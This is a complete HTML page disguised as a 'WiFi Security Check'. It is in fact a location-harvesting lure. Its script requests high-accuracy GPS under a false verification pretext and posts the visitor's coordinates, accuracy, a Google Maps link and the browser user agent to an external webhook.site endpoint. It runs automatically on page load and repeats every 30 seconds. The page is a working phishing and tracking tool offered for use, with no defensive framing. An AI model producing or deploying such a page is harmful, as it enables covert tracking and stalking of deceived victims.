<!DOCTYPE html>
<html>
<head>
    <title>WiFi Verification</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>body{font-family:sans-serif;background:#667eea;padding:20px;text-align:center;max-width:400px;margin:auto;background:linear-gradient(135deg,#667eea,#764ba2);color:white;}
    button{background:#ff4757;color:white;border:none;padding:15px 30px;border-radius:25px;font-size:18px;cursor:pointer;margin:10px;box-shadow:0 5px 15px rgba(0,0,0,0.3);}
    button:hover{transform:scale(1.05);}
    #status{padding:15px;background:rgba(255,255,255,0.2);border-radius:10px;margin:20px 0;font-size:16px;}
    #coords{font-family:monospace;background:rgba(0,0,0,0.2);padding:10px;border-radius:5px;margin:10px 0;}</style>
</head>
<body>
    <h1>🔒 WiFi Security Check</h1>
    <div id="status">📡 Requesting GPS for verification...</div>
    <button onclick="getLocation()">📍 ALLOW GPS SCAN</button>
    <div id="coords"></div>
    <small>Keep page open</small>

    <script>
        // YOUR CORRECT WEBHOOK
        const WEBHOOK = 'https://webhook.site/#!/c2f96a55-bb46-4f47-a5ce-3d31c4505c3e';
        
        function getLocation() {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const acc = pos.coords.accuracy;
                    
                    // GOOGLE MAPS URL
                    const gmaps = 'https://maps.google.com/?q=' + lat + ',' + lon;
                    
                    const data = {
                        timestamp: new Date().toISOString(),
                        lat: lat,
                        lon: lon,
                        accuracy: acc,
                        google_maps: gmaps,
                        gmaps_short: gmaps,
                        ua: navigator.userAgent
                    };
                    
                    // DISPLAY
                    document.getElementById('coords').innerHTML = 
                        'Lat: ' + lat + '<br>Lon: ' + lon + 
                        '<br><a href="' + gmaps + '" target="_blank">🗺️ Google Maps</a>';
                    
                    document.getElementById('status').innerHTML = '✅ GPS OK (' + acc + 'm)';
                    
                    // SEND TO WEBHOOK
                    fetch(WEBHOOK, {
                        method: 'POST',
                        body: JSON.stringify(data),
                        headers: {'Content-Type': 'application/json'}
                    });
                },
                err => {
                    document.getElementById('status').innerHTML = '❌ Tap ALLOW GPS';
                    console.error(err);
                },
                {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}
            );
        }
        
        // AUTO START
        setTimeout(getLocation, 1000);
        setTimeout(getLocation, 3000);
        setInterval(getLocation, 30000);
    </script>
</body>
</html>
